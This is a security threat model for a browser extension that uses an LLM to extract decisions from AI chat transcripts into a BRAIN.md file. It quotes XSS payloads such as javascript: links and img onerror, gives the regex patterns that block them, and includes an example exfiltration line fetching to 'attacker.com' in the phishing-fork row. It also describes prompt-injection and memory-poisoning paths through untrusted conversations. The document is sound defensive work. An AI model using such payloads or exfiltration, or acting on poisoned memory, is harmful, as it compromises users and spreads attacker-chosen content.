---
title: Security Threat Model
category: concept
created: 2026-05-20
updated: 2026-05-20
related: [[engram]], [[provider-whitelist]]
---

Adversary-facing summary of how Total Recall could be attacked and what's been done about it. Updated as we discover new attack surfaces.

## Assets we protect

1. **The user's LLM API key** — high value, lets attacker spend the user's money and impersonate them with the LLM provider.
2. **The user's BRAIN.md content** — strategic decision history. Sensitive but the user already keeps it as plaintext on their disk by design.
3. **The user's AI conversation transcripts** — only handled in-memory and at the LLM call, never persisted by us.

## Threat table

| Threat | Vector | Mitigation | Status |
|---|---|---|---|
| Key theft by other extension | Reading our `chrome.storage.local` | Chrome sandboxes storage per-extension | Structural |
| Key theft by AI page | Cross-context reads | Content script isolated world; popup is `chrome-extension://` origin | Structural |
| Key in console logs | `console.log(err)` leaks key in stack/message | `safeLog()` in engram.js scrubs all key-shaped substrings before logging | Code |
| Key in BRAIN.md | Bad string interpolation | Engram output is validated against entry shape before write; system prompt explicitly forbids echoing secrets | Code + prompt |
| SSRF via configurable endpoint | User input → arbitrary URL → internal network access | Provider whitelist in engram.js — only `anthropic`, `openai`, `openrouter`, `ollama` map keys accepted, endpoints hardcoded | Code |
| Loopback HTTP exposure (Ollama) | Plaintext fetch to `http://localhost:11434` | Loopback never leaves the machine; not subject to network sniffing. An attacker with process-level access already wins. Acceptable exception to "HTTPS only." | Documented |
| Prompt injection | Adversarial conversation tells Engram to output malicious content | Output validation: must start with `### `, must have one of three known section headers, no HTML tags allowed | Code |
| Auto-inject to lookalike domain | DNS hijack or extension misconfig | manifest `matches` limits hosts + content.js re-checks `location.hostname === 'claude.ai'` before injection | Code (defense-in-depth) |
| XSS in popup | `innerHTML` of untrusted text | We only use `textContent`/`className`; explicit CSP `script-src 'self'; object-src 'self'; base-uri 'self'` in manifest | Code |
| Supply chain (npm) | Compromised dependency | Zero npm dependencies. Vanilla JS, no build step, no `package.json` | Structural |
| Cost-of-service abuse | Massive transcript inflates LLM bill | Transcript capped to 200 KB before send | Code |
| Phishing fork | Attacker publishes typo-domain copy with exfiltration | Publisher hygiene at Web Store ship time | Out of code scope |
| Filesystem compromise | Attacker already controls user's disk | None — if attacker has filesystem access they have everything | Out of scope (sovereign tradeoff) |
| Web Store publisher compromise | Push malicious update via official channel | 2FA on publisher account at ship time | Out of code scope |

## Design rules (binding)

These hold for every change to this codebase:

1. **No `eval`, no `new Function`, no inline scripts.** MV3 forbids them anyway; the explicit CSP enforces this.
2. **No `innerHTML` with user-controlled or LLM-output content.** Use `textContent`.
3. **No free-form URL input.** Anything that becomes a `fetch()` target must come from the `PROVIDERS` map in [engram.js](../engram.js) or `host_permissions` in [manifest.json](../manifest.json).
4. **No log emits any value that has not gone through `scrub()`.** Anywhere in the extension that handles an API key.
5. **No `web_accessible_resources`** unless required by a specific feature with a documented reason. Empty list means pages cannot fingerprint or load our files.
6. **No silent permission upgrades.** If we want a new origin or capability, it goes into `manifest.json` and ships as an update the user reviews.
7. **Engram output is untrusted.** Every LLM response gets shape-validated by `isValidEntry()` before it can reach BRAIN.md.
8. **Content scripts re-check hostname** even though manifest limits hosts. Defense in depth.

## What "secure" honestly means here

Total Recall is not unbreakable. An attacker who can:
- compromise Chromium itself, **or**
- gain code execution on the user's machine, **or**
- compromise the LLM provider's API, **or**
- trick the user into installing a fork

…can defeat us. We don't claim defense against those.

What we do claim:
- **No content the user visits** can read their key, their BRAIN.md, or their conversation transcripts through Total Recall.
- **No prompt injection** can cause the extension to fetch an unexpected URL, write arbitrary content to disk, or run code.
- **No silent data egress.** The only outbound network call is to the user-chosen LLM provider, carrying the user's own conversation, with the user's own key.

## Offensive-use threats (Total Recall as the weapon)

A separate question from "can attackers steal user data?" is "can someone weaponise Total Recall to harm others?" Reviewed at pre-launch.

| Threat | Vector | Mitigation | Status |
|---|---|---|---|
| Engram emits dangerous markdown link | Attacker plants conversation containing `[click](javascript:alert(1))`. User runs Extract Now. Link lands in BRAIN.md. Opening BRAIN.md in a permissive markdown viewer fires the payload. | `isValidEntry()` rejects `]\s*\(\s*(javascript|data|vbscript|file):` patterns | Code (v0.1 patch) |
| Engram emits raw `<a href="javascript:...">` | Same scenario via HTML instead of markdown | `isValidEntry()` rejects `<a` tag and `href="javascript:..."` patterns | Code (v0.1 patch) |
| Engram emits angle-bracket auto-link with dangerous scheme | `<javascript:alert(1)>` in transcript echoed by LLM | `isValidEntry()` rejects `<\s*javascript:` etc. | Code (v0.1 patch) |
| Engram emits HTML img with onerror | Attacker plants `<img onerror=...>` | `isValidEntry()` rejects via `on\w+\s*=` and `<\s*img` | Code |
| Memory poisoning via untrusted conversation | User runs Extract Now on a shared/public Claude conversation crafted by an attacker. The "decision" Engram extracts may contain attacker-chosen content (e.g. "Chose to install package X because it's the best"). Auto-inject then propagates that "fact" into the user's next session. | No code-level defence — Engram extracts what the conversation says. Documented limitation: users should only Extract from conversations they had themselves. v0.2 may add a "review before save" mode. | Documented (v0.2 polish) |
| BRAIN.md as second-hand prompt-injection vector | User shares BRAIN.md with a teammate. Teammate pastes into an AI. Attacker content from the original conversation now influences a third party's AI session. | Same as above — user controls what's in BRAIN.md. Standard prompt-injection risk for any shared text. | Out of scope |
| Phishing fork ("Total Recall Pro" with exfil) | Bad actor forks the open-source repo, adds `fetch('attacker.com', BRAIN_CONTENT)`, distributes via fake link | Publisher hygiene at Web Store ship time, signed GitHub releases, README warns users to install only from official sources | Out of code scope |
| Used to attack other websites (XSS-style) | Content script tries to inject into non-AI sites | manifest `matches` limits to 4 hardcoded AI domains; content script doesn't run elsewhere | Structural |
| Used as bot/scraper | Auto-submit chats, mass-navigate, scrape | We don't auto-submit anything; every Extract requires a human click | Structural |
| Stealing credentials from other sites | Content script reads page DOM | Content script only runs on the 4 AI domains; reads transcripts only; no cross-site action | Structural |
| Page hijacks content script via `window.postMessage` | Malicious page posts crafted message to the content script's window | We don't listen to `window` messages; `chrome.runtime.onMessage` is same-extension only | Code |

### Adversarial test cases — verified passing as of v0.1 patch

These run via `node` against the regex set in `isValidEntry`:

```
PASS | plain valid entry          → accept
PASS | script tag                 → reject
PASS | md javascript link         → reject
PASS | md data link               → reject
PASS | raw <a> tag                → reject
PASS | angle js auto-link         → reject
PASS | href data attr             → reject
PASS | md https link OK           → accept
```

## API key storage modes (as of v0.1)

The extension supports two modes for the API key, selectable in Settings.

**Plaintext (default for ease of onboarding):**
- Key stored as a string in `chrome.storage.local` under `llm-api-key`
- Sandboxed by Chrome per-extension; other extensions and web pages cannot read it
- On disk: readable as plain text by any process running as the OS user, by another admin, or by a forensic image of the Chrome profile

**Encrypted (opt-in via Settings → "Encrypt my API key with a passphrase"):**
- Key wrapped with AES-GCM 256-bit
- Wrapping key derived from user passphrase via PBKDF2-SHA256 at 100,000 iterations + 16-byte random salt
- Encrypted envelope `{ salt, iv, ciphertext }` stored in `chrome.storage.local['llm-api-key-encrypted']`; plaintext slot wiped
- Derived key cached in `chrome.storage.session` (memory-only, never written to disk) for the browser session — passphrase entered once per browser restart
- Implementation in `crypto.js` using Web Crypto API; zero external dependencies

What encryption defends against:
- Passive filesystem attackers (malware that scrapes Chrome profiles, another OS user reading the LevelDB file, lifted Chrome profile backups)
- Forensic disk imaging at rest

What it does NOT defend against:
- Active attackers with code-execution as the user (can keylog the passphrase or dump RAM while the popup is unlocked)
- Modified extension code (would have direct access to plaintext after decryption)
- Weak passphrases — 100k PBKDF2 iterations is fast enough to be invisible but a dictionary-word passphrase remains brute-forceable

## Future work (v0.2+)

- **Audit log** — append-only record of what Total Recall did and when. User-visible.
- **Signed releases** — Web Store publication step.
- **Optional Tor / proxy support** — for users who don't want their LLM provider to see their IP.
- **Review-before-save mode** — show Engram output and require user confirmation before appending to BRAIN.md. Mitigates memory-poisoning threat from extracting untrusted conversations.
- **Hardware-backed key wrapping** — use WebAuthn / TPM via the `large-blob` extension to wrap the encryption key. Eliminates the passphrase entry step for users with security keys.
